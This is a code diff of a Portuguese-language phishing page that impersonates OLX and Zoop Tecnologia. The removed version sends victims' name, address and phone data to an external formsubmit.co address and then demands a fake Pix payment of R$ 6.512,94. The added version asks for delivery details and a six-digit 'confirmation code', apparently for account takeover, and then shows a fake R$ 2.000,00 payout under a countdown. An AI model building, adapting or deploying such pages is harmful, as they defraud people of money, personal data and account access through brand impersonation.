@@ -2,167 +2,160 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Envio e Pagamento</title>
+  <title>Confirmação de Entrega</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       font-family: Arial, sans-serif;
       background: #f2f2f2;
+      margin: 0;
+      padding: 0;
     }
-
     .container {
-      width: 100%;
-      max-width: 100%;
+      max-width: 400px;
+      margin: 40px auto;
+      background: white;
       padding: 20px;
-      background: #fff;
-      min-height: 100vh;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
     h2 {
-      margin-bottom: 20px;
       text-align: center;
       color: #333;
     }
-
-    input, textarea {
+    label {
+      display: block;
+      margin: 12px 0 5px;
+    }
+    input {
       width: 100%;
-      margin-bottom: 12px;
-      padding: 14px;
+      padding: 10px;
+      border-radius: 8px;
       border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
     }
-
     button {
-      background: #f60;
-      color: white;
-      padding: 14px;
-      border: none;
       width: 100%;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .alerta {
-      background: #fff4cc;
       padding: 12px;
+      background: #ff6900;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .loading-bar {
+      height: 10px;
+      width: 0%;
+      background: #ff6900;
       border-radius: 5px;
-      font-size: 15px;
-      margin-bottom: 20px;
+      margin-top: 15px;
+      transition: width 1s;
     }
-
-    .alerta strong { font-weight: bold; }
-
-    .tempo {
-      color: #f60;
-      font-weight: bold;
-    }
-
-    .valor {
-      font-size: 24px;
-      color: #333;
-      margin: 10px 0;
-    }
-
-    .pix-code {
-      background: #eee;
-      padding: 14px;
-      border-radius: 5px;
-      word-break: break-word;
-      font-size: 15px;
-      margin-top: 10px;
-    }
-
-    ol {
-      padding-left: 20px;
-      font-size: 15px;
-      color: #333;
-      margin-top: 20px;
-    }
-
-    a {
-      color: purple;
-      text-decoration: none;
-    }
-
-    #pagamento {
+    .hidden {
       display: none;
+    }
+    .center {
+      text-align: center;
+    }
+    .code-input {
+      font-size: 24px;
+      letter-spacing: 10px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <!-- TELA 1 -->
-  <div class="container" id="formulario">
+  <!-- TELA 1 - DADOS DE ENTREGA -->
+  <div id="tela1" class="container">
     <h2>Preencha seus dados de entrega</h2>
-    <form id="envioForm">
-      <input type="text" name="nome" placeholder="Nome completo" required>
-      <input type="text" name="endereco" placeholder="Endereço completo" required>
-      <input type="text" name="bairro" placeholder="Bairro" required>
-      <input type="text" name="cidade" placeholder="Cidade" required>
-      <input type="text" name="cep" placeholder="CEP" required>
-      <input type="tel" name="telefone" placeholder="WhatsApp" required>
+    <form id="form1" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <label>Nome completo</label>
+      <input type="text" name="nome" required>
+      
+      <label>Endereço completo</label>
+      <input type="text" name="endereco" required>
+
+      <label>CEP</label>
+      <input type="text" name="cep" required>
+
+      <label>Cidade</label>
+      <input type="text" name="cidade" required>
+
+      <label>Estado</label>
+      <input type="text" name="estado" required>
+
+      <label>Telefone</label>
+      <input type="text" name="telefone" required>
+
       <button type="submit">Continuar</button>
     </form>
   </div>
 
-  <!-- TELA 2 -->
-  <div class="container" id="pagamento">
-    <div class="alerta">
-      ⚠️ Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a <strong>Zoop Tecnologia</strong>, cuida do pagamento até você receber seu produto!
-    </div>
+  <!-- TELA 2 - CONFIRMAÇÃO DE CÓDIGO -->
+  <div id="tela2" class="container hidden">
+    <h2>Código de Confirmação</h2>
+    <p class="center">Enviamos um código para validar a entrega. Insira abaixo:</p>
+    <form id="form2" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input class="code-input" type="text" name="codigo" maxlength="6" required placeholder="------">
+      <button type="submit">Validar Código</button>
+    </form>
+  </div>
 
-    <p><strong>Seu código expira em:</strong> <span class="tempo">04m 39s</span></p>
+  <!-- LOADING + RESULTADO -->
+  <div id="tela3" class="container hidden">
+    <h2 class="center">Aguardando confirmação</h2>
+    <div class="loading-bar" id="loadingBar"></div>
+  </div>
 
-    <div style="margin-top: 15px;">
-      <p><strong>Pague por Pix</strong></p>
-      <p class="valor">R$ 6.512,94</p>
-      <p><strong>Processado por</strong><br>Zoop tecnologia</p>
-    </div>
-
-    <p style="margin-top: 15px;"><strong>Copie o código de pagamento:</strong></p>
-    <div class="pix-code" id="pixcode">00020101021226850014br.gov.bcb.pix.qr1234567890abcde</div>
-    <button onclick="copiarPix()">Copiar código Pix</button>
-
-    <ol>
-      <li>Acesse o app do seu banco ou Internet Banking e escolha Pix copia e cola.</li>
-      <li>Cole o código, confira se o pagamento será feito para Zoop Tecnologia.</li>
-      <li>Confirme o pagamento.</li>
-      <li>Prontinho! Acompanhe o pedido em <a href="#">Minhas Compras</a></li>
-    </ol>
+  <!-- TELA FINAL -->
+  <div id="telaFinal" class="container hidden">
+    <h2 class="center">Parabéns!</h2>
+    <p class="center">Você recebeu: <strong style="color:green;">R$ 2.000,00</strong></p>
+    <p class="center">Tempo restante: <span id="contador">60</span> segundos</p>
   </div>
 
   <script>
-    const form = document.getElementById("envioForm");
-    const formulario = document.getElementById("formulario");
-    const pagamento = document.getElementById("pagamento");
+    const form1 = document.getElementById('form1');
+    const form2 = document.getElementById('form2');
 
-    form.addEventListener("submit", function(e) {
+    const tela1 = document.getElementById('tela1');
+    const tela2 = document.getElementById('tela2');
+    const tela3 = document.getElementById('tela3');
+    const telaFinal = document.getElementById('telaFinal');
+    const loadingBar = document.getElementById('loadingBar');
+    const contador = document.getElementById('contador');
+
+    form1.addEventListener('submit', function(e) {
       e.preventDefault();
-      const formData = new FormData(form);
-      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        body: formData
-      }).then(() => {
-        formulario.style.display = "none";
-        pagamento.style.display = "block";
-        window.scrollTo(0, 0);
-      }).catch(() => {
-        alert("Erro ao enviar os dados. Tente novamente.");
-      });
+      tela1.classList.add('hidden');
+      tela2.classList.remove('hidden');
     });
 
-    function copiarPix() {
-      const codigo = document.getElementById("pixcode").innerText;
-      navigator.clipboard.writeText(codigo);
-      alert("Código Pix copiado!");
+    form2.addEventListener('submit', function(e) {
+      e.preventDefault();
+      tela2.classList.add('hidden');
+      tela3.classList.remove('hidden');
+      loadingBar.style.width = '100%';
+
+      setTimeout(() => {
+        tela3.classList.add('hidden');
+        telaFinal.classList.remove('hidden');
+        iniciarContador();
+      }, 3000);
+    });
+
+    function iniciarContador() {
+      let segundos = 60;
+      const interval = setInterval(() => {
+        segundos--;
+        contador.textContent = segundos;
+        if (segundos <= 0) {
+          clearInterval(interval);
+        }
+      }, 1000);
     }
   </script>
 
